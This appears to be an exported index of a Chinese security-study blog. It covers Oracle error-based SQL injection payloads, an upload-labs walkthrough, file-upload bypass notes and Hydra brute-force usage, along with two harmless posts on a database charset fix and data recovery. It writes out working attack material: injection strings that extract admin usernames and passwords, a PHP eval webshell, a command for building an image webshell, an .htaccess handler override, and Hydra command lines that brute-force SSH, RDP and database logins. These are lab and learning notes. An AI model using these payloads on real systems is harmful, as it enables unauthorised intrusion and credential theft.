style="text-align:center">服务器操作系统</td><td style="text-align:left">select member from v$logfile where rownum=1</td></tr><tr><td style="text-align:center">服务器sid</td><td style="text-align:left">select instance_name from v$instance</td></tr><tr><td style="text-align:center">当前连接用户</td><td style="text-align:left">select SYS_CONTEXT (‘USERENV’, ‘CURRENT_USER’) from dual</td></tr><tr><td style="text-align:center">日志文件</td><td style="text-align:left">select member from v$logfile where rownum=1</td></tr></tbody></table><h3 id="报错注入-2">报错注入</h3><ul><li><p>utl_inaddr.get_host_name()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;utl_inaddr.get_host_name((select user from dual))--</span><br></pre></td></tr></table></figure></li><li><p><a href="http://ctxsys.drithsx.sn">ctxsys.drithsx.sn</a>()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;ctxsys.drithsx.sn(1,(select user from dual))--</span><br></pre></td></tr></table></figure></li><li><p>XMLType()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is</span><br><span class="line">not null --</span><br></pre></td></tr></table></figure></li><li><p>dbms_xdb_version.checkin()</p></li></ul>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure><ul><li><p>bms_xdb_version.makeversioned()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null -</span><br></pre></td></tr></table></figure></li><li><p>dbms_xdb_version.uncheckout()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure></li><li><p>dbms_utility.sqlid_to_sqlhash()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure></li><li><p>ordsys.ord_dicom.getmappingxpath()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)--</span><br></pre></td></tr></table></figure></li><li><p>decode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这种方式更偏向布尔型注入，因为这种方式并不会通过报错把查</span><br><span class="line">询结果回显回来，仅是用来作为页面的表现不同的判断方法</span><br><span class="line"></span><br><span class="line">and 1&#x3D;(select decode(substr(user,1,1),&#39;S&#39;,(1&#x2F;0),0) from dual) --</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>报错 admin 表的 用户和密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;utl_inaddr.get_host_name((select (select</span><br><span class="line">username%7c%7cpassword from admin)from dual))--</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="posts/80f02bc5/"/>
      <url>posts/80f02bc5/</url>
      
        <content type="html"><![CDATA[<h2 id="搭建">搭建</h2><p align="center">  <img title="portainer" src='https://raw.githubusercontent.com/c0ny1/upload-labs/master/img/logo.png' /></p><p align="center">  <img title="portainer" src='https://img.shields.io/badge/version-0.1-brightgreen.svg' />  <img title="portainer" src='https://img.shields.io/badge/php-5.*-yellow.svg' />  <img title="portainer" src='https://img.shields.io/badge/license-MIT-red.svg' /></p><p><a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><h2 id="Pass-01-前端绕过">Pass-01(前端绕过)</h2><p>准备php一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">phpinfo();</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传一句话木马时提示</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210508174932.png" alt="image-20210508174925579"></p><p>重命名后缀为png</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210508175139.png" alt="image-20210508175133543"></p><p>在burp中修改为php</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210508175131.png" alt="image-20210508175124122"></p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210508180026.png" alt="image-20210508180018350"></p><p>连接菜刀</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210508180224.png" alt="image-20210508180216841"></p><h2 id="Pass-02-MIME绕过">Pass-02(MIME绕过)</h2><p>清空上传文件</p><p>如同01中操作上传成功</p><p>当然也可直接上传php后缀文件</p><p>修改Content-Type 为image/jpeg</p><h2 id="Pass-03-apache解析漏洞">Pass-03(apache解析漏洞)</h2><p>上传文件发现报错</p><p>提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！</p><p>那么尝试修改后缀</p><p>如php3</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210508182050.png" alt="image-20210508182044319"></p><p>发现php3 不解析</p><p>那么尝试phtml</p><p>也不解析</p><p>查了下 好像要修改配置orz</p><p>修改 /etc/mime.types中</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210508184244.png" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 reload</span><br></pre></td></tr></table></figure><p>解析成功了</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210508184500.png" alt="image-20210508184452310"></p><h2 id="Pass-04-Apache配置文件-htaccess">Pass-04(Apache配置文件.htaccess)</h2>]]></content>
      
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> upload-labs </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于文章保存数据库报错</title>
      <link href="posts/46c9d2a9/"/>
      <url>posts/46c9d2a9/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/vfsdfdsf/article/details/89672717">MySQL数据库字符集utf8如何转utf8mb4</a><br>将数据库和已经建好的表也转换成utf8mb4</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">        更改数据库编码(字符集)：<span class="keyword">ALTER</span> DATABASE DATABASE_NAME  <span class="keyword">DEFAULT</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br><span class="line"></span><br><span class="line">          更改表编码(字符集)（注意：这里修改的是表的字符集，表里面字段的字符集并没有被修改）：<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> TABLE_NAME <span class="keyword">DEFAULT</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci; </span><br></pre></td></tr></table></figure><p>更改表编码(字符集)和表中所有字段的编码(字符集)：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*ALTER TABLE TABLE_NAME CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> typecho_comments <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> typecho_contents <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> typecho_fields <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> typecho_mail <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> typecho_metas <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> typecho_options <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> typecho_relationships <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> typecho_users <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> typecho </category>
          
      </categories>
      
      
        <tags>
            
            <tag> typecho </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据恢复</title>
      <link href="posts/31ff5219/"/>
      <url>posts/31ff5219/</url>
      
        <content type="html"><![CDATA[<p>在过去几天用了 UFS    DISK-DRILL  DATA-RESCUE RECUVA DiskGenius<br>说实话  找到数据的有   disk-drill ufs<br>ufs 找到数据但是恢复失败</p><p>这个是DISKDRILL找到的</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210421145355.png" alt="image-20210421145348686"></p><p>这是R.STUDIO找到的结果</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210421145208.png" alt="image-20210421145200688"></p><p>R.STUDIO 能够找到目录结构    超惊喜</p><p>如何使用</p><p>点击分区 右键查看文件</p>]]></content>
      
      
      <categories>
          
          <category> 数据恢复 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据恢复 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="posts/592e5fba/"/>
      <url>posts/592e5fba/</url>
      
        <content type="html"><![CDATA[<h2 id="文件上传过程">文件上传过程</h2><p>客户端: 选择发送文件–&gt;前端检测–&gt;服务器接收–&gt;程序检测–&gt;临时文件–&gt;移动到指定目录</p><h2 id="文件上传错误代码">文件上传错误代码</h2><p>值：0; 没有错误发生，文件上传成功。<br>值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。<br>值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。<br>值：3; 文件只有部分被上传。<br>值：4; 没有文件被上传</p><h2 id="网站文件常见的后缀名">网站文件常见的后缀名</h2><p>asp<br>asa<br>cdx<br>cer<br>php<br>aspx<br>ashx<br>jsp<br>php3<br>php.a<br>shtml<br>phtml<br>过滤的时候可以传入这种格式<br>aspasp<br>phpphp<br>大小写转换</p><h2 id="造成漏洞的原因">造成漏洞的原因</h2><h3 id="程序代码和系统缺陷">程序代码和系统缺陷</h3><ul><li><p>文件可以直接上传 可执行脚本  test.php</p></li><li><p>js脚本限制  禁止 js文件运行</p><ul><li>修改 html</li><li>抓包改包</li><li>直接在 jpg上面修改代码</li><li>在包里面修改后缀名</li></ul></li><li><p>黑名单过滤不全   穷举后缀名  test.phtml<br>黑名单 指定的后缀名是禁止上传的</p></li></ul><p>白名单 就是允许上传文件后缀<br>jpg png gif 等其他图片格式</p><p>asp<br>asa<br>cdx<br>cer<br>php<br>aspx<br>ashx<br>jsp<br>php3<br>php.a<br>shtml<br>phtml<br>ASP<br>ASA<br>CDX<br>CER<br>PHP<br>ASPX<br>ASHX<br>JSP<br>PHP3<br>PHP.A<br>SHTML<br>PHTML<br>Asp<br>Asa<br>Cdx<br>Cer<br>Php<br>Aspx<br>Ashx<br>Jsp<br>Php3<br>Php.a<br>Shtml<br>Phtml</p><ul><li>文件名可控 后缀名不可控  iis6.0解析漏洞  test.asp;.jpg test.asp;jpg</li><li>目录解析漏洞 iis6.0 文件夹为 x.asp 只要上传文件到这个文件夹里 访问就会执行脚本</li><li>%00截断的应用场景<br> 直接截断文件名<br> 创建目录可控 %00截断创建目录 利用iis6.0解析漏洞 上传文件到这个目录里面<br> 截断参数 生成文件</li><li>文件类型的检测  修改 http文件类型</li><li>文件头检测     修改文件头 或 图片一句话<br> JPEG (jpg)，文件头：FFD8FF<br> PNG (png)，文件头：89504E47<br> GIF (gif)，文件头：47494638<br> TIFF (tif)，文件头：49492A00<br> Windows Bitmap (bmp)，文件头：424D<br>制作图片一句话<br>copy 1.gif/b+test.php shell.php</li></ul><h3 id="程序逻辑出错">程序逻辑出错</h3><p>双文件上传<br>空格文件上传</p><h3 id="部署环境">部署环境</h3><p>apache开启重写模块<br>LoadModule rewrite_module modules/mod_rewrite.so<br>重写解析   .htaccess<br>&lt;FilesMatch “jpg”&gt;<br>SetHandler application/x-httpd-php<br></FilesMatch></p><h3 id="配置错误-1-jpg-php">配置错误   1.jpg/.php</h3><p>iis7.0|iis7.5|nginx 开启 fast-cgi</p><h3 id="漏洞">漏洞</h3><p>nginx 0.83</p><p>/1.jpg%00php</p><h3 id="系统特性">系统特性</h3><p>上传文件名 a.php:.jpg的时候 会在目录下生成 a.php的空白文件<br>php+window+iis<br>利用 PHP 和 Windows环境的叠加特性，以下符号在正则匹配时的相等性：<br>双引号&quot;     =   点号.<br>大于符号&gt;   =   问号?<br>小于符号&lt;   =   星号*<br>文件名.&lt;或文件名.&lt;&lt;&lt;或文件名.&gt;&gt;&gt;或文件名.&gt;&gt;&lt;空文件名<br>写入 filename.&lt;&lt;&lt;</p><h3 id="NTFS交换数据流">NTFS交换数据流</h3><p>:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>创建文件</mtext><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA 创建文件 ::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">创建文件</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">::</span></span></span></span>DATA 创建和写入文件</p><h3 id="补充">补充</h3><p>window系统里面会把文件名的最后一个点 会自动去掉<br>如上传 test.php.最后还是会变成 test.php</p>]]></content>
      
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>穷举</title>
      <link href="posts/e93fc31a/"/>
      <url>posts/e93fc31a/</url>
      
        <content type="html"><![CDATA[<h2 id="常见端口">常见端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">1,web类(web漏洞&#x2F;敏感目录)</span><br><span class="line"></span><br><span class="line">第三方通用组件漏洞struts thinkphp jboss ganglia zabbix</span><br><span class="line"></span><br><span class="line">80 web </span><br><span class="line">80-89 web </span><br><span class="line">8000-9090 web</span><br><span class="line"></span><br><span class="line">2,数据库类(扫描弱口令)</span><br><span class="line"></span><br><span class="line">1433 MSSQL </span><br><span class="line">1521 Oracle </span><br><span class="line">3306 MySQL </span><br><span class="line">5432 PostgreSQL </span><br><span class="line"></span><br><span class="line">3,特殊服务类(未授权&#x2F;命令执行类&#x2F;漏洞)</span><br><span class="line"></span><br><span class="line">443 SSL心脏滴血 </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">5984 CouchDB http:&#x2F;&#x2F;xxx:5984&#x2F;_utils&#x2F; </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br><span class="line"></span><br><span class="line">4,常用端口类(扫描弱口令&#x2F;端口爆破)</span><br><span class="line"></span><br><span class="line">21 ftp </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet </span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line">3389 远程桌面</span><br><span class="line"></span><br><span class="line">端口合计详情</span><br><span class="line"></span><br><span class="line">21 ftp </span><br><span class="line"> </span><br><span class="line">22 SSH </span><br><span class="line"> </span><br><span class="line">23 Telnet </span><br><span class="line"> </span><br><span class="line">80 web </span><br><span class="line"> </span><br><span class="line">80-89 web </span><br><span class="line"> </span><br><span class="line">161 SNMP </span><br><span class="line"> </span><br><span class="line">389 LDAP </span><br><span class="line"> </span><br><span class="line">443 SSL心脏滴血以及一些web漏洞测试 </span><br><span class="line"> </span><br><span class="line">445 SMB </span><br><span class="line"> </span><br><span class="line">512,513,514 Rexec </span><br><span class="line"> </span><br><span class="line">873 Rsync未授权 </span><br><span class="line"> </span><br><span class="line">1025,111 NFS </span><br><span class="line"> </span><br><span class="line">1433 MSSQL </span><br><span class="line"> </span><br><span class="line">1521 Oracle:(iSqlPlus Port:5560,7778) </span><br><span class="line"> </span><br><span class="line">2082&#x2F;2083 cpanel主机管理系统登陆 （国外用较多）</span><br><span class="line"> </span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外用较多） </span><br><span class="line"> </span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line"> </span><br><span class="line">3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 </span><br><span class="line"> </span><br><span class="line">3306 MySQL </span><br><span class="line"> </span><br><span class="line">3312&#x2F;3311 kangle主机管理系统登陆 </span><br><span class="line"> </span><br><span class="line">3389 远程桌面 </span><br><span class="line"> </span><br><span class="line">4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 </span><br><span class="line"> </span><br><span class="line">5432 PostgreSQL </span><br><span class="line"> </span><br><span class="line">5900 vnc </span><br><span class="line"> </span><br><span class="line">5984 CouchDB http:&#x2F;&#x2F;xxx:5984&#x2F;_utils&#x2F; </span><br><span class="line"> </span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 </span><br><span class="line"> </span><br><span class="line">6379 redis未授权 </span><br><span class="line"> </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line"> </span><br><span class="line">7778 Kloxo主机控制面板登录 </span><br><span class="line"> </span><br><span class="line">8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 </span><br><span class="line"> </span><br><span class="line">8080 tomcat&#x2F;WDCP主机管理系统，默认弱口令 </span><br><span class="line"> </span><br><span class="line">8080,8089,9090 JBOSS </span><br><span class="line"> </span><br><span class="line">8083 Vestacp主机管理系统 （国外用较多） </span><br><span class="line"> </span><br><span class="line">8649 ganglia </span><br><span class="line"> </span><br><span class="line">8888 amh&#x2F;LuManager 主机管理系统默认端口 </span><br><span class="line"> </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line"> </span><br><span class="line">10000 Virtualmin&#x2F;Webmin 服务器虚拟主机管理系统 </span><br><span class="line"> </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line"> </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line"> </span><br><span class="line">28017 mongodb统计页面 </span><br><span class="line"> </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line"> </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Hydra">Hydra</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">-R 继续从上一次进度接着破解。 </span><br><span class="line"> </span><br><span class="line">-S 采用 SSL 链接。 </span><br><span class="line"> </span><br><span class="line">-s PORT 可通过这个参数指定非默认端口。 </span><br><span class="line"> </span><br><span class="line">-l LOGIN 指定破解的用户，对特定用户破解。 </span><br><span class="line"> </span><br><span class="line">-L FILE 指定用户名字典。 </span><br><span class="line"> </span><br><span class="line">-p PASS 小写，指定密码破解，少用，一般是采用密码字典。 </span><br><span class="line"> </span><br><span class="line">-P FILE 大写，指定密码字典。 </span><br><span class="line"> </span><br><span class="line">-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。 </span><br><span class="line"> </span><br><span class="line">-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P 参数。 </span><br><span class="line"> </span><br><span class="line">-M FILE 指定目标列表文件一行一条。 </span><br><span class="line"> </span><br><span class="line">-o FILE 指定结果输出文件。 </span><br><span class="line"> </span><br><span class="line">-f 在使用-M 参数以后，找到第一对登录名或者密码的时候中止破解。 </span><br><span class="line"> </span><br><span class="line">-t TASKS 同时运行的线程数，默认为 16。 -w TIME 设置最大超时的时间，单位秒，默认是 30s。 </span><br><span class="line"> </span><br><span class="line">-v / -V 显示详细过程。 </span><br><span class="line">-o 指定输出文件</span><br><span class="line">service 指定服务名，支持的服务和协议：telnetftp pop3[-ntlm] imap[-ntlm] smb smbnt  http-&#123;head|get&#125; http-&#123;get|post&#125;-formhttp-proxy cisco cisco-enable vnc  ldap2 ldap3 mssql mysql oracle-listenerpostgres nntp socks5 rexec  rlogin pcnfs snmp rsh cvs svn icq sapr3 sshsmtp-auth[-ntlm] pcanywhere  teamspeak sip vmauthd firebird ncp afp 等等</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P password.txt ssh://***.***.***.*** -vV -t 15</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[STATUS] attack finished <span class="keyword">for</span> ***.***.***.*** (waiting <span class="keyword">for</span> children to complete tests)</span><br><span class="line">1 of 1 target completed, 0 valid password found</span><br></pre></td></tr></table></figure><p>指定多个ip进行穷举  导入-M IP地址文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P password.txt -M ip.txt ssh -o IPS.txt</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /root/user -P /root/passwd ssh://192.168.1.0 -f -o /root/crack.txt -V </span><br><span class="line">ftp </span><br><span class="line">hydra -L /root/user -P /root/passwd ftp://192.168.1.0 -f -o /root/crack.txt -V </span><br><span class="line">rdp </span><br><span class="line">hydra -L /root/user -P /root/passwd rdp://192.168.1.0 -f -o /root/crack.txt -V </span><br><span class="line">mssql </span><br><span class="line">hydra -L /root/user -P /root/passwd mssql://192.168.0.129 -f -o /root/crack.txt -v </span><br><span class="line">mysql </span><br><span class="line">hydra -L /root/user -P /root/passwd mysql://192.168.0.129 -f -o /root/crack.txt –v -s 3306 </span><br><span class="line">oracle </span><br><span class="line">hydra -P /root/passwd oracle://192.168.0.129 -f -o /root/crack.txt –v </span><br><span class="line">redis </span><br><span class="line">hydra -P /root/passlist.txt -e nsr -t 16 192.168.0.101 redis </span><br><span class="line">postgresql 弱口令检测 </span><br><span class="line">hydra -P /root/passlist.txt -e nsr -t 16 192.168.0.101 postgresql </span><br><span class="line">指定多个ip进行穷举 </span><br><span class="line">hydra -L /root/user -P /root/passlist -M /root/ip.txt  -V -o /root/crack mysql -t 16 </span><br><span class="line">hydra -L /root/user -P /root/passlist ssh://192.168.0.112 -vV -f </span><br><span class="line">hydra -L /root/user -P /root/passlist ssh://192.168.0.112 -vV -f -o /root/crack.txt </span><br><span class="line">hydra -L /root/user -P /root/passlist ftp://192.168.0.106 -vV -f -o /root/crack.txt 